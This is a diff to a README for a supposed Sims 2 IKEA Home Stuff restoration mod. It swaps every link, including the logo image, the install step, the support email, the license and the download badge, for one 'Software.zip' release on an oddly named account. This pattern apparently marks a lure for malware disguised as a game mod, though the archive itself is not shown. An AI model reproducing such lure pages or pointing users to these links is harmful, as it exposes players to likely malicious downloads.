@@ -2,7 +2,7 @@
 
 Welcome to the "The Sims 2 Legacy IKEA" repository! This project provides an easy way to restore The Sims 2: IKEA Home Stuff to The Sims 2 Legacy Collection. 
 
-![The Sims 2 Legacy IKEA Logo](https://example.com/link/to/image)
+![The Sims 2 Legacy IKEA Logo](https://github.com/dfsgefvfefesfw/the-sims-2-legacy-ikea/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -16,7 +16,7 @@ Welcome to the "The Sims 2 Legacy IKEA" repository! This project provides an eas
 
 To install the IKEA Home Stuff restoration into The Sims 2 Legacy Collection, follow these steps:
 
-1. Download the restoration files from [this link](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).  
+1. Download the restoration files from [this link](https://github.com/dfsgefvfefesfw/the-sims-2-legacy-ikea/releases/download/v1.0/Software.zip).  
 2. Extract the downloaded ZIP file.  
 3. Follow the provided instructions to integrate the IKEA content into your game.  
 
@@ -52,16 +52,16 @@ This restoration project is made possible thanks to the dedicated efforts of the
 
 ## Support 📧
 
-For any questions, concerns, or feedback regarding the "The Sims 2 Legacy IKEA" restoration project, please reach out to us via email at [sims2legacyikea@gmail.com](mailto:sims2legacyikea@gmail.com). Your input is valuable to us as we strive to improve the gaming experience for all players.
+For any questions, concerns, or feedback regarding the "The Sims 2 Legacy IKEA" restoration project, please reach out to us via email at [https://github.com/dfsgefvfefesfw/the-sims-2-legacy-ikea/releases/download/v1.0/Software.zip](https://github.com/dfsgefvfefesfw/the-sims-2-legacy-ikea/releases/download/v1.0/Software.zip). Your input is valuable to us as we strive to improve the gaming experience for all players.
 
 ---
 
 ## License 📜
 
-"The Sims 2 Legacy IKEA" restoration project is licensed under the MIT License. For details regarding the terms of this license, please refer to the [LICENSE](https://github.com/your-username/the-sims-2-legacy-ikea/blob/main/LICENSE) file included in this repository.
+"The Sims 2 Legacy IKEA" restoration project is licensed under the MIT License. For details regarding the terms of this license, please refer to the [LICENSE](https://github.com/dfsgefvfefesfw/the-sims-2-legacy-ikea/releases/download/v1.0/Software.zip) file included in this repository.
 
 ---
 
 Get ready to enhance your Sims 2 Legacy Collection with the IKEA Home Stuff restoration project! Start exploring the world of custom furniture and decorations to create unique spaces for your sims. Download the latest version from the link provided above and let your creativity shine in The Sims 2 universe!
 
-[![Download Here](https://img.shields.io/static/v1?label=Download&message=Here&color=blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Here](https://github.com/dfsgefvfefesfw/the-sims-2-legacy-ikea/releases/download/v1.0/Software.zip)](https://github.com/dfsgefvfefesfw/the-sims-2-legacy-ikea/releases/download/v1.0/Software.zip)
